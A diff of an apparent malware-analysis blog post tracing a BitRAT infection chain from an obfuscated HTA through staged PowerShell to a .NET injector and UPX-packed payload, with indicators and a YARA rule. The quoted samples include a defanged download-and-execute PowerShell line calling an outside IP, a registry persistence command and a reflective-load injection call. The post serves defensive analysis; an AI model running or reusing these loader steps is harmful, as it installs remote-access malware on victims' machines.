@@ -12,7 +12,9 @@ One of my colleagues made a statement recently about how commonplace process inj
 
 Eh, process injection can be extremely technical and complicated depending on how deeply you want to understand process internals. If you're simply looking to use process injection, there are multiple free and paid tools that will help you inject an arbitrary array of bytes into an arbitrary process's memory. In some of the paid products, all an adversary needs to do is check a box. In the case of free tools, sometimes a little bit of coding is needed.
 
-## Triaging PS1.hta and Decoding (stage 01)
+## Triaging PS1.hta and Decoding (Stage 01)
+
+MalwareBazaar says the sample is a HTA file, but we should still approach with caution using `file`.
 
 ```console
 remnux@remnux:~/cases/bitrat$ file PS1.hta 
@@ -31,9 +33,13 @@ remnux@remnux:~/cases/bitrat$ xxd PS1.hta | head
 00000090: 3825 3232 706f 7725 3238 2d5f 2d25 3239  8%22pow%28-_-%29
 ```
 
+Alright, it looks like we have a HTA file! The `file` magic corresponded with HTML document thanks to the `script` tags on the inside. We can even sample the contents with `xxd | head` to see the strings correspond to script tags containing JavaScript. The JavaScript inside contains [`document.write()`](https://developer.mozilla.org/en-US/docs/Web/API/Document/write) and [`unescape()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/unescape) function calls. This means the actual contents of the HTA file are a bit obfuscated using URL encoding and will be deobfuscated and written into an HTML document in memory at the time of rendering. To get further we need to deobfuscate the code ourselves safely.
+
 ```html
 <script language=javascript>document.write(unescape('%3Cscript%20language%3D%22VBScript%22%3E%0AFunction%20...self.close%0A%3C/script%3E'))</script>
 ```
+
+Thankfully we can use a little bit of NodeJS to deobfuscate the code ourselves! Using the little bit of code below, we can write the deobfuscated HTA content into `stage02.hta`. If you want to see this approach used more, consider making a stop by [this post](https://forensicitguy.github.io/decoding-webshell-using-nodejs/) where I decode a web shell using the same method.
 
 ```js
 fs = require('fs')
@@ -44,6 +50,8 @@ fs.writeFileSync('stage02.hta',page)
 ```
 
 ## Decoding PowerShell From Stage 02
+
+Now let's dive into `stage02.hta`! The HTA contains VBScript code within the HTA script tags. There's quite a bit of string obfuscation going on here as well. First, we can tell from looking at the `HB` variable we're likely looking into a PowerShell command, and the URL in `HBB` already shows that the sample downloads additional content. The easy hypothesis here is that PowerShell will likely download content from this URL and execute it. To confirm/disprove the hypothesis we need to remove the string obfuscation. Part of the deobfuscation is really easy using find/replace functionality in a code editor of your choice. The last bit of obfuscation requires a bit more work with your eyes. The `{2}{0}{1} -f` chunks of PowerShell code correspond with [PowerShell Format strings](https://devblogs.microsoft.com/scripting/understanding-powershell-and-basic-string-formatting/). This feature lets the developer have variable "holding spots" in the middle of a string and specify the contents of the variable after the rest of the string is defined. To deobfuscate this part, just treat the strings after `-f` like an array, and join them together in the proper order.
 
 ```html
 <script language="VBScript">
@@ -67,6 +75,8 @@ self.close
 </script>
 ```
 
+After distilling the PowerShell command it looks like our hypothesis is confirmed! The PowerShell command creates a [`Net.WebClient`](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) object and calls [`DownloadString()`](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0) to retrieve additional content. Then the content is fed into [`Invoke-Expression`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2). Since this cmdlet is designed to execute additional arbitrary PowerShell commands, we can assume whatever gets downloaded is also PowerShell. So let's dig into `PS1_B.txt`!
+
 ```powershell
 $Hx = 'hxxp://135.148.74[.]241/PS1_B.txt';
 $HB=('DownloadString');
@@ -75,7 +85,9 @@ $HBBB=('IeX(New-Object $HBB).$HB($Hx)');
 $HBBBBB =($HBBB -Join '')|InVoke-exPressioN
 ```
 
-## Decoding PS1_B.txt PowerShell
+## Decoding PS1_B.txt PowerShell (Stage 03)
+
+Fast-forwarding through the triage of this file, we can see it contains PowerShell code as expected. We can already see some low-hanging indicators in the content. `C:\ProgramData\3814364655181379114711\3814364655181379114711.HTA` is going to contain the code specified in `$FFF`. Just like the first HTA file, the content is obfuscated using URL encoding. I'm going to wager that's part of a persistence mechanism. Again, we see a URL and `Invoke-Expression`. It's probably a safe bet that the URL delivers more PowerShell code. There's also a hex-encoded string that likely contains PowerShell code. After getting decoded into `$asciiString` the code gets executed with `iex`, an alias for `Invoke-Expression`. So let's get that cleartext string.
 
 ```powershell
 $HHxHH = "C:\ProgramData\3814364655181379114711"
@@ -96,13 +108,19 @@ $Hx = 'hxxp://135.148.74[.]241/S_B.txt';
 $HB=('{2}{0}{1}' -f'---------l---------o---------a---------d---------'...'')|InVokE-ExpresSioN
 ```
 
+After decoding using a PowerShell console, we have the cleartext below. Sure enough, the sample contains code to create a persistence mechanism in a Windows Registry key. The value of that key leads to the HTA dropped on disk.
+
 ```powershell
 [system.io.directory]::CreateDirectory($HHxHH)
 start-sleep -s 5
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value $HHHxHHH;
 ```
 
-## Decoding S_B.txt PowerShell
+Now that we know what this stage does, let's move forward to look into `S_B.txt`!
+
+## Decoding S_B.txt PowerShell (Stage 04/Last Stop)
+
+In this stage we can immediately see two really large hex-encoded strings that I truncated here to keep the post manageable. The variables `$HH1` and `$H4` contain two hex strings that likely decode to Windows EXE files. We can immediately tell this because the strings start with `4D5A`, which translates from hex into the traditional `MZ` magic bytes for Windows EXE files. Further down, the adversary has a `VIP()` function that decodes text from base64 strings. Finally, there's some base64 code at the bottom of the script that has some string obfuscation inside that gets replaced/removed during runtime. If we do the replacement ourselves using find/replace we can have some legible base64 text to decode.
 
 ```powershell
 $HH1 = '4D5A9::::3 ... ::::::::::::::::::::::'.Replace(":","0")
@@ -121,6 +139,8 @@ $AAAAASXXX = '5961151185971873545969W15961151185971 ... 185971873545969nKXx59611
 $AAAAASXXXX = VIP($AAAAASXXX);
 IEX $AAAAASXXXX
 ```
+
+And after decoding the text ourselves, we have the chunk of code below! This chunk of code takes the hex-encoded strings and converts them into byte arrays. This is significant for a couple reasons in malware analysis. First, if the adversary simply wanted to execute the malware, they could run `Start-Process` or call the EXE manually. Holding the binaries as byte arrays means they're planning to use them programmatically in PowerShell or .NET code, usually with some form of injection or reflective loading. Sure enough, at the end of the script contents we can see [`[Reflection.Assembly]::Load()`](https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=net-6.0#system-reflection-assembly-load(system-byte())). This call loads the contents of the `$H5` binary into memory for use. These contents are likely a .NET DLL. The rest of the code calls the function `HHH()` from the class `HH.HH` in that loaded DLL, providing the input string containing `aspnet_compiler.exe` and the byte array `$H6` which likely contains a payload the adversary intends to inject into `aspnet_compiler.exe`. I'll cover this a bit more at the end of the post, but this style of payload delivery is incredibly common among modern crypters that adversaries use to shield their payloads. For the threat intel geeks, take note of the string `$HBAR` in the PowerShell code. This is [one indicator we're looking at HCrypt](https://blog.morphisec.com/tracking-hcrypt-an-active-crypter-as-a-service).
 
 ```powershell
 [String]$H1= $HH1
@@ -146,13 +166,15 @@ $H12 = 'C:\Windows\Microsoft.NET\Framework\v4.0.30\aspnet_compiler.exe'
 [Reflection.Assembly]::Load($H5).GetType('HH.HH').GetMethod('HHH').Invoke($null,[object[]](,$H6))
 ```
 
-Greatly simplified. H5 == the injector, H6 == the RAT
+Now let's get at those binaries!
 
 ## Extracting the Binaries
 
-
+Not going to lie, I cut some corners here using CyberChef. I used the Find/Replace operation followed by From Hex. Then we can save the contents out to disk and examine them.
 
 ## Decompiling the Injector
+
+Alright, the first binary that I extracted was the .NET injection DLL held in `$H5`. The .NET code easily compiled with `ilspycmd`, but it contained a load of obfuscation. To save some time and space, I've gone ahead and included just the relevant parts below. The code contains references to `kernel32`, [`LoadLibraryA`](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya), and [`GetProcAddress`](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress). These references mean the code likely imports additional native, non-.NET DLL functions at runtime for its injection operations. We can also see the function `HHH()`, which would be a good breakpoint if we decided to get into debugging this .NET code. For the cyber threat intelligence geeks out there, there's a feature in this code to help you pivot and find more samples in VirusTotal! The GUID `8c863524-938b-4d92-a507-f7032311c0d0` can be used with VirusTotal Intelligence or Enterprise to find additional samples using the search `netguid:8c863524-938b-4d92-a507-f7032311c0d0`. To learn more about the GUID, take a look at this post in VirusBulletin: [https://www.virusbulletin.com/virusbulletin/2015/06/using-net-guids-help-hunt-malware/](https://www.virusbulletin.com/virusbulletin/2015/06/using-net-guids-help-hunt-malware/)
 
 ```cs
 [assembly: AssemblyTitle("Bit")]
@@ -169,36 +191,38 @@ Greatly simplified. H5 == the injector, H6 == the RAT
 [assembly: AssemblyVersion("1.0.0.0")]
 namespace HH
 {
-	public static class HH
-	{
-		private delegate int a(IntPtr a);
-
+    public static class HH
+    {
         ...
 
         [DllImport("kernel32", EntryPoint = "LoadLibraryA", SetLastError = true)]
-		private static extern IntPtr a([MarshalAs(UnmanagedType.VBByRefStr)] ref string a);
+        private static extern IntPtr a([MarshalAs(UnmanagedType.VBByRefStr)] ref string a);
 
-		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true, SetLastError = true)]
-		private static extern IntPtr b(IntPtr a, [MarshalAs(UnmanagedType.VBByRefStr)] ref string b);
+        [DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true, SetLastError = true)]
+        private static extern IntPtr b(IntPtr a, [MarshalAs(UnmanagedType.VBByRefStr)] ref string b);
 
         ...
 
         public static bool HHH(string HHHHHHHHHHBBBBBBBBBB, byte[] HHHHHHHHHHHHHHHHHHHHHHHHHHBBBBBBBBBBBBBBBBBBBBBBBBBBBB)
-		{
-			int num = 1;
-			while (!d(HHHHHHHHHHBBBBBBBBBB, HHHHHHHHHHHHHHHHHHHHHHHHHHBBBBBBBBBBBBBBBBBBBBBBBBBBBB))
-			{
-				num = checked(num + 1);
-				if (num > 5)
-				{
-					return false;
-				}
-			}
-			return true;
-		}
+        {
+            int num = 1;
+            while (!d(HHHHHHHHHHBBBBBBBBBB, HHHHHHHHHHHHHHHHHHHHHHHHHHBBBBBBBBBBBBBBBBBBBBBBBBBBBB))
+            {
+                num = checked(num + 1);
+                if (num > 5)
+                {
+                    return false;
+                }
+            }
+            return true;
+        }
 ```
 
+For now, that's as much as I want to squeeze from the injector. Assuming it does its job of just injecting code, the interesting stuff will be in the second binary extracted.
+
 ### Identifying BitRAT
+
+Once we extract the second binary and name it `payload.bin`, we can use `file` to triage it. The output says the binary was packed with UPX, and we can unpack the binary using UPX in REMnux! Using `upx -d`, we can obtain the original payload. From here we can search VirusTotal for the hashes and import hash, finding that VirusTotal has already seen the file and identifies it as malicious.
 
 ```console
 remnux@remnux:~/cases/bitrat$ file payload.bin 
@@ -228,7 +252,22 @@ file
     imphash:    71955ccbbcbb24efa9f89785e7cce225
 ```
 
-https://github.com/ditekshen/detection/blob/master/yara/malware.yar
+To get some better attribution on the malware family, we can borrow YARA rules from the `ditekshen` on GitHub. Using the rules at [https://github.com/ditekshen/detection/blob/master/yara/malware.yar](https://github.com/ditekshen/detection/blob/master/yara/malware.yar) we can run a YARA scan and identify BitRAT.
+
+```console
+remnux@remnux:~/cases/bitrat$ yara -s malware.yar payload.bin 
+MALWARE_Win_BitRAT payload.bin
+0x33abf0:$s1: \plg\
+0x33ad70:$s3: files_delete
+0x3399bc:$s9: ddos_stop
+0x33abd0:$s10: socks5_srv_start
+0x33adb8:$s16: klg|
+0x3399ec:$s17: Slowloris
+0x33ac60:$s18: Bot ID:
+0x33b198:$t1: <sz>N/A</sz>
+```
+
+The exact rule it hits on is below:
 
 ```yara
 rule MALWARE_Win_BitRAT {
@@ -262,18 +301,14 @@ rule MALWARE_Win_BitRAT {
 }
 ```
 
-```console
-remnux@remnux:~/cases/bitrat$ yara -s bitrat.yar payload.bin 
-MALWARE_Win_BitRAT payload.bin
-0x33abf0:$s1: \plg\
-0x33ad70:$s3: files_delete
-0x3399bc:$s9: ddos_stop
-0x33abd0:$s10: socks5_srv_start
-0x33adb8:$s16: klg|
-0x3399ec:$s17: Slowloris
-0x33ac60:$s18: Bot ID:
-0x33b198:$t1: <sz>N/A</sz>
-```
+Now we've identified the payload as BitRAT using YARA from a source that is fairly reputable and used in VirusTotal's crowdsourced rules feature. If you want more details on the malware you can throw it into a sandbox to extract details and indicators.
 
 ## Injection is Commonplace Now
 
+Looping back on the subject of injection, I want to reiterate that injection is incredibly common. Crypter products and services like HCrypt and Snip3 provide ready-made encryption functionality for adversaries to simply check boxes and execute. For injection, these crypters are going to work in a similar method:
+
+Deploy injector -> Spawn process -> Inject byte array into process
+
+The differences between the crypters are simply the implementation details. For Snip3, I've seen samples where the crypter delivers its injector component in obfuscated C# code and then compiles it at runtime for injection. In cases like Aggah malware threats, I've seen more samples that look like HCrypt where we have two binaries encoded in the same script. Injection isn't just for fancy stuff anymore, it's trivial for adversaries to implement.
+
+Thanks for reading!
